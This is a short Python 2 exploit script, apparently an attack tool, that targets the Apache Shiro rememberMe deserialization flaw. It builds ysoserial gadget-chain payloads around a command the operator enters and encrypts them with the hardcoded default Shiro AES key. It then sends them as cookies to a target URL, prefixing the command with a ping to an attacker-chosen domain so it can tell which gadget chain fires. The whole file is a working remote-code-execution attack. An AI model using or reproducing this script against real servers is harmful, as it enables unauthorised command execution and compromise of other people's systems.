#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2020/07/17
# @Author  : psponge



import sys
import base64
import uuid
from random import Random
import subprocess
from Crypto.Cipher import AES
import time
import requests
import re
import json
import urllib2


from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def encode_rememberme(payload,commands,key1):
        popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-SNAPSHOT.jar', payload, commands], stdout=subprocess.PIPE)
        BS  = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        key  =  key1
        print key
        #print commands
        mode =  AES.MODE_CBC
        iv  =  uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
        return base64_ciphertext
	
if __name__ == '__main__':
    command = raw_input("please input your command:")
    vuln_web = raw_input("please input your vuln web:")
    keys = [
'kPH+bIxk5D2deZiIxcaaaA==']
    for key1 in keys:
        time_key = str(time.time())
        sub_payloads = ['CommonsCollections{}'.format(i) for i in xrange(1,7)]
        payload_normal = ['C3P0','Clojure','CommonsBeanutils1','DynamicDependencies','FileUpload1','Groovy1',
		'Hibernate1','Hibernate2','JBossInterceptors1','JRMPClient','JRMPListener','JSON1','JavassistWeld1',
		'Jdk7u21','Jython1','MozillaRhino1','MozillaRhino2','Myfaces1','Myfaces2','ObjectPayload','ROME',
		'ReleaseableObjectPayload','Spring1','Spring2','URLDNS','Vaadin1','Wicket1','BeanShell1']
        payloads = sub_payloads+payload_normal
        print payloads
        for payload  in payloads:
            time_payload = str(time.time())
            pay= payload
            commands = 'ping' +' '+pay+'.'+command
            print commands
            payload = encode_rememberme(payload,commands,key1)
            headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
        'X-Forwarded-For': '127.0.0.1',
        'Cookie':'rememberMe=' + payload,
        'Accept':'*/*',
        'Content-Type': 'application/x-www-form-urlencoded',
        }
            s = requests.Session()
            vulurl = vuln_web
            try:
                proxies = {'http': '127.0.0.1:8080','https': '127.0.0.1:8080'}
           
                resp = s.get(vulurl,headers=headers,timeout=8,verify=False)
                print resp.status_code
            except Exception,e:
                 print e
